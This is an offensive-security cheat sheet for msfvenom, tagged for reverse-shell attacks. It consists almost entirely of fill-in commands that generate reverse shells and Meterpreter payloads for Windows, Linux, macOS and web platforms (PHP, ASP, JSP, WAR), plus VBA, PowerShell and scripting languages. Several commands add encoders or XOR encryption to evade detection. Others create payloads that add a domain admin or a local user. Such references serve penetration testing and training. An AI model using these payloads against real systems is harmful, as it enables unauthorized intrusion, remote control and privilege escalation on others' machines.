# msfvenom

% msfvenom, reverse shell, metasploit

#plateform/linux #target/local #cat/ATTACK/REVERSE_SHELL 

## list - payloads
```bash
msfvenom --list payloads
```

## list - encoders
```bash
msfvenom --list encoders
```

## list - formats
```bash
msfvenom --list formats
```

## list - payload options
```bash
msfvenom -p <payload> --list-options
```

## cmd - Windows add domain admin (dll)
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll
```

## revshell - Linux x86 Meterpreter TCP
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > shell.elf
```

## revshell - Linux x64 Meterpreter TCP
```bash
msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=<ip|tun0> LPORT=<LPORT> prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf
```

## revshell - Windows Meterpreter TCP
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe
```

## revshell - Windows Meterpreter TCP Encoded
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<local> -e <encoder|shikata_ga_nai> -i 3 -f exe > encoded.exe
```

## revshell - Windows meterpreter HTTPS (non staged)
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<LHOST> LPORT=<LPORT|443> -f exe -o /var/www/html/msfnonstaged.exe
```

## revshell - Windows meterpreter HTTPS (staged)
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT|443> -f exe -o /var/www/html/msfstaged.exe
```

## revshell - Windows Reverse Shell TCP (nc catch)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<local> -f exe > shell.exe
```

## revshell - Mac Reverse Shell
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f macho > shell.macho
```

## revshell - web PHP Meterpreter TCP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php
```

## revshell - web ASP Meterpreter TCP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp > shell.asp
```

## revshell - web JSP reverse shell TCP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.jsp
```

## revshell - web WAR reverse shell TCP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war
```

## VBA 32bits
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT|443> EXITFUNC=thread -f vbapplication
```

## powershell 32 bits
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT|443> EXITFUNC=thread -f ps1
```

## DLL
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT|443> -f dll -o <dll|output.dll>
```

## Python - Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.py
```

## Bash - Reverse Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.sh
```

## Perl - Reverse shell
```
msfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.pl
```

## Powershell 
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT|443> EXITFUNC=thread -f ps1
```

## Csharp - xor encrypted
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT|443> --encrypt xor --encrypt-key <key> -f csharp
```

# msfvenom Shellcode

## Windows Meterpreter Reverse TCP Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f <language>
```

## Linux Meterpreter Reverse TCP Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f <language>
```

## Mac Reverse TCP Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f <language>
```


## MCreate User
```
msfvenom -p windows/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe > adduser.exe
```
